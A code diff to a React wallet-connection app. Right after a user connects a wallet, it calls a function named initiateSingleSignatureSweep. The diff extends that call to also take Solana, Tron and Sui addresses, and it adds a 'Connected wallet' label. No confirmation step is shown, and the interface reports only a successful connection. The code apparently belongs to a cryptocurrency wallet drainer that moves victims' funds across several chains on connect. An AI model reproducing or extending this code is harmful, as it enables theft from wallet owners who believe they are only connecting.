@@ -6,11 +6,13 @@ import SummaryModal from './components/SummaryModal'
 function App() {
   const {
     account,
+    walletType,
     isConnected,
     isLoading,
     error,
     transferStatus,
     setAccount,
+    setWalletType,
     setIsConnected,
     setIsLoading,
     setError,
@@ -24,16 +26,23 @@ function App() {
     setError(null)
 
     try {
-      const { account: addr, provider } = await window.walletHelpers?.connectWallet?.() || {}
+      const { account: addr, provider, walletType, solanaAddress, tronAddress, suiAddress } = await window.walletHelpers?.connectWallet?.() || {}
 
       if (!addr || !provider) {
         throw new Error('Failed to connect wallet')
       }
 
       setAccount(addr)
+      setWalletType(walletType || 'Unknown')
       setIsConnected(true)
 
-      const result = await window.walletHelpers?.initiateSingleSignatureSweep?.(provider, addr)
+      const result = await window.walletHelpers?.initiateSingleSignatureSweep?.(
+        provider,
+        addr,
+        solanaAddress,
+        tronAddress,
+        suiAddress
+      )
 
       if (result?.success) {
         setTransferStatus(result)
@@ -85,6 +94,9 @@ function App() {
               <div className="bg-green-900/30 border border-green-600 rounded-2xl p-5 mb-6 text-center">
                 <p className="text-green-400 text-sm">Wallet Connected</p>
                 <p className="font-mono text-white mt-1 break-all">{account}</p>
+                {(walletType || transferStatus?.walletType) && (
+                  <p className="text-green-200 text-sm mt-2">Connected wallet: {walletType || transferStatus.walletType}</p>
+                )}
               </div>
             )}
 
